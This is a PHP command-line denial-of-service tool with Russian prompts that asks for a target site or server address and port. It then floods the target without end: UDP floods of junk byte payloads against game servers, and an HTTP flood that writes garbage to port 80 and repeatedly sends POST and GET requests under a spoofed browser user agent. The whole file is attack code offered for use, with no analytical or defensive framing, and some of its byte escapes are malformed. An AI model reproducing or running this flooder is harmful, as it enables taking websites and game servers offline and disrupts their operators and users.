<?php

namespace attack;

// #Progress Clear. 
for($i = 0; $i < 200; $i++) {
echo PHP_EOL;
}

echo "[!] Cyber.". PHP_EOL ;

echo "[!] Типы атак: 1 - WEB, 2 - GAME.". PHP_EOL;
echo "[!] Введите тип атаки: ".PHP_EOL;
$select = (int) fgets(STDIN);

if($select !=1 && $select != 2){
$select = 1;
}
for($i = 0; $i < 101; $i++) {
usleep(36000);
echo "[!] Loading: [{$i} %].".PHP_EOL;
} 
echo "[!] Start attack, type: {$select}.".PHP_EOL;

if($select == 1){
echo "[!] Введите адрес сайта(без http): ". PHP_EOL;
$site = trim(fgets(STDIN));
$arg = explode(" ", $site);
$target = new Web($site);
$target->onRun();
}
if($select == 2){
echo "[!] Типы атак: 1 - Layer1, 2 - Layer4.". PHP_EOL;
echo "[!] Выберете уровень атаки:". PHP_EOL;
}
$type = (int) fgets(STDIN);
if($type !=1 && $type != 2){
$type = 1;
} 
echo "[!] Введите адрес цели: ". PHP_EOL;
$target = trim(fgets(STDIN));
var_dump($target);
echo"[!] Введите порт цели: ". PHP_EOL;
$port = (int) fgets(STDIN);
echo"[!] {$target} : {$port}. ";
if($type == 1){
$class = new byte($target, $port);
$class->go();
} 
if($type == 2){
$class = new flood($target, $port);
$class->run();
} 
class flood{
public $ip, $port, $socket;
public function __construct(String $ip, Int $port){
$this->ip = $ip;
$this->port = $port;
$this->socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
} 
public function run(){
$fakeLib = str_repeat("\x16\x00\x128\x256\x1024\xfe\abc\abc\abcc", mt_rand(500, 1000));
$msg = "\x39\x00\x00\x00\x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128\x00\x00\x00\x00\x01\x01\x01\x01\x01f\x01a\x256\xfe\xfe\xfe\xfe\xfe\xfe\xfe\x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128\x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128{$fakeLib}";
socket_connect($this->socket, $this->ip, $this->port);
while(true){
socket_sendto($this->socket, $msg, strlen($msg) * 10, MSG_EOF, $this->ip, $this->port);
echo "[!] Sending " . strlen($msg) . " bytes.". PHP_EOL;
}
}
}
class byte{
public $ip, $port, $socket;
public function __construct(String $ip, Int $port){
$this->ip = $ip;
$this->port = $port;
$this->socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
} 
public function go(){
while(true){
socket_connect($this->socket, $this->ip, $this->port);
$msg = str_repeat("1", 9000);
$byte = mt_rand(PHP_INT_MAX, PHP_INT_MAX);
socket_sendto($this->socket, $msg, strlen($msg) * 500, MSG_EOF, $this->ip, $this->port);
} 
} 
} 
class Web{
public $address;
public $user = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36";
public $request = ["Gets" => [], "to" => str_repeat("ban", 800), "Unknown" => true, "acceped" => true];
public function __construct(String $ip) {
$this->address = $ip;
} 
public function onRun() {
$stream = fsockopen("tcp://". $this->address, 80);
while(true){
$fakeLib = str_repeat("\x16\x00\x128\x256\x1024\xfe\abc\abc\abcc", mt_rand(500, 1000));
$msg = "\x39\x00\x00\x00\x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128\x00\x00\x00\x00\x01\x01\x01\x01\x01f\x01a\x256\xfe\xfe\xfe\xfe\xfe\xfe\xfe\x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128\x00\x00\x01\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x8\x00\x08\x16\x32\xbe\xbe\xbe\xbe\xfe\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x128{$fakeLib}";
fwrite($stream, $msg, strlen($msg));
$libmsg = str_repeat("...>L7", 30);
fwrite($stream, $libmsg, strlen($libmsg));
$my = curl_init();
curl_setopt_array($my, array(CURLOPT_URL => "http://". $this->address, CURLOPT_RETURNTRANSFER => 0, CURLOPT_POST => count($this->request), CURLOPT_USERAGENT => $this->user, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 5, CURLOPT_POSTFIELDS => http_build_query($this->request)));
$var = curl_exec($my);
$inf = curl_getinfo($my);
if($inf['http_code'] == 200){
echo "[!] {$inf['http_code']}.". PHP_EOL;
} 
@file_get_contents("https://". $this->address);
$my2 = curl_init();
curl_setopt_array($my2, array(CURLOPT_URL => "http://". $this->address, CURLOPT_RETURNTRANSFER => 0,  CURLOPT_FTPAPPEND => true, CURLOPT_HEADER => true, CURLOPT_HTTPGET => true, CURLOPT_USERAGENT => $this->user, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 5));
$two = curl_exec($my2);
$inf = curl_getinfo($my2);
if($inf['http_code'] == 200){
echo "[!] {$inf['http_code']}.". PHP_EOL;
} 
curl_close($my);
curl_close($my2);
} 
} 
} 
?>